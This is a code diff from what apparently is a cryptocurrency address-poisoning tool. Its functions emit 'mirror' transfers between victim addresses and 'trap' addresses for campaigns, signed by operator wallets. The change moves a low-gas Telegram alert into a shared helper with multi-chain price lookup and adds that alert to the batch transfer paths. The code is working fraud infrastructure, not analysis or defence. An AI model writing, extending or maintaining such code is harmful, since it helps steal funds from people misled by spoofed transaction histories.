@@ -445,6 +445,48 @@ def get_mirror_operator_key(campaign_id):
         logger.error(f"Failed to get mirror operator key: {e}")
         return None
 
+
+def send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Mirror"):
+    """Send a rate-limited Telegram alert for insufficient gas (once per hour per wallet)."""
+    now = time.time()
+    last_alert = _last_gas_insufficient_alert.get(operator_addr, 0)
+    if now - last_alert > 3600: # Rate limit: Once per hour
+        # Map chain to CoinGecko ID
+        coin_id = "ethereum"
+        if CHAIN.lower() == "bsc": coin_id = "binancecoin"
+        elif CHAIN.lower() == "polygon": coin_id = "matic-network"
+        
+        try:
+            price_data = json.loads(urllib.request.urlopen(
+                urllib.request.Request(
+                    f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd",
+                    headers={'User-Agent': 'CipherNet/1.0'}
+                ), timeout=3
+            ).read().decode())
+            native_price = price_data[coin_id]['usd']
+            needed_usd = float(needed_eth) * native_price
+            have_usd = float(have_eth) * native_price
+            fund_usd = max(10.0, float(shortfall) * native_price * 100)
+            fund_native = fund_usd / native_price
+            price_line = f" (~${needed_usd:.2f} needed, ~${have_usd:.4f} balance)"
+            fund_suggestion = f"{fund_native:.4f} {NATIVE_SYMBOL} (~${fund_usd:.2f})"
+        except Exception:
+            price_line = ""
+            fund_suggestion = f"0.01 {NATIVE_SYMBOL}"
+        
+        alert_msg = (
+            f"⛽ Insufficient Gas in Funding Wallet ({context})\n\n"
+            f"Your campaign funding wallet cannot emit batch events.\n\n"
+            f"🔑 Wallet: `{operator_addr}`\n"
+            f"📊 Needed: `{needed_eth:.8f} {NATIVE_SYMBOL}`{price_line}\n"
+            f"💰 Balance: `{have_eth:.8f} {NATIVE_SYMBOL}`\n"
+            f"📉 Shortfall: `{shortfall:.8f} {NATIVE_SYMBOL}`\n\n"
+            f"💡 Fund this wallet with at least **{fund_suggestion}** to continue operations."
+        )
+        send_telegram(alert_msg, campaign_id=campaign_id)
+        _last_gas_insufficient_alert[operator_addr] = now
+    
+
 def get_explorer_url(address, link_type='address'):
     """Generate Etherscan/BscScan/PolygonScan URL."""
     base_urls = {
@@ -591,47 +633,12 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
         operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
         gas_cost = 60000 * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
         if operator_balance < gas_cost:
-            needed_eth = w3.from_wei(gas_cost, 'ether')
-            have_eth = w3.from_wei(operator_balance, 'ether')
+            needed_eth = float(w3.from_wei(gas_cost, 'ether'))
+            have_eth = float(w3.from_wei(operator_balance, 'ether'))
             shortfall = needed_eth - have_eth
             
             logger.error(f"[mirror] Operator {operator_addr} has insufficient gas. Need {needed_eth}, have {have_eth}")
-            
-            # Rate-limited Telegram alert (once per hour per operator)
-            now = time.time()
-            last_alert = _last_gas_insufficient_alert.get(operator_addr, 0)
-            if now - last_alert > 3600:
-                # Get approximate USD value
-                try:
-                    price_data = json.loads(urllib.request.urlopen(
-                        urllib.request.Request(
-                            f"https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
-                            headers={'User-Agent': 'CipherNet/1.0'}
-                        ), timeout=3
-                    ).read().decode())
-                    eth_price = price_data['ethereum']['usd']
-                    needed_usd = float(needed_eth) * eth_price
-                    have_usd = float(have_eth) * eth_price
-                    fund_usd = max(10.0, float(shortfall) * eth_price * 100)  # Suggest 100x shortfall or min $10
-                    fund_eth = fund_usd / eth_price
-                    price_line = f" (~${needed_usd:.2f} needed, ~${have_usd:.4f} balance)"
-                    fund_suggestion = f"{fund_eth:.4f} ETH (~${fund_usd:.2f})"
-                except Exception:
-                    price_line = ""
-                    fund_suggestion = "0.01 ETH"
-                
-                alert_msg = (
-                    f"⛽ Insufficient Gas in Funding Wallet\n\n"
-                    f"Your campaign funding wallet cannot emit mirror events.\n\n"
-                    f"🔑 Wallet: `{operator_addr}`\n"
-                    f"📊 Needed: `{needed_eth}` ETH{price_line}\n"
-                    f"💰 Balance: `{have_eth}` ETH\n"
-                    f"📉 Shortfall: `{shortfall}` ETH\n\n"
-                    f"💡 Fund this wallet with at least **{fund_suggestion}** to continue mirror operations."
-                )
-                send_telegram(alert_msg, campaign_id=campaign_id)
-                _last_gas_insufficient_alert[operator_addr] = now
-            
+            send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Single Mirror")
             return None
 
         signed = w3.eth.account.sign_transaction(tx, operator_key)
@@ -725,9 +732,11 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
         gas_cost = estimated_gas * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
         
         if operator_balance < gas_cost:
-            needed_eth = w3.from_wei(gas_cost, 'ether')
-            have_eth = w3.from_wei(operator_balance, 'ether')
+            needed_eth = float(w3.from_wei(gas_cost, 'ether'))
+            have_eth = float(w3.from_wei(operator_balance, 'ether'))
+            shortfall = needed_eth - have_eth
             logger.error(f"[batch-mirror] Insufficient gas. Need {needed_eth}, have {have_eth}")
+            send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Batch Mirror")
             return None
         
         signed = w3.eth.account.sign_transaction(tx, operator_key)
@@ -839,9 +848,11 @@ def emit_multi_token_batch_transfers(queue, campaign_id):
         gas_cost = estimated_gas * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
         
         if operator_balance < gas_cost:
-            needed_eth = w3.from_wei(gas_cost, 'ether')
-            have_eth = w3.from_wei(operator_balance, 'ether')
+            needed_eth = float(w3.from_wei(gas_cost, 'ether'))
+            have_eth = float(w3.from_wei(operator_balance, 'ether'))
+            shortfall = needed_eth - have_eth
             logger.error(f"[multi-batch] Insufficient gas. Need {needed_eth}, have {have_eth}")
+            send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Multi-Token Batch")
             return None
             
         signed = w3.eth.account.sign_transaction(tx, operator_key)
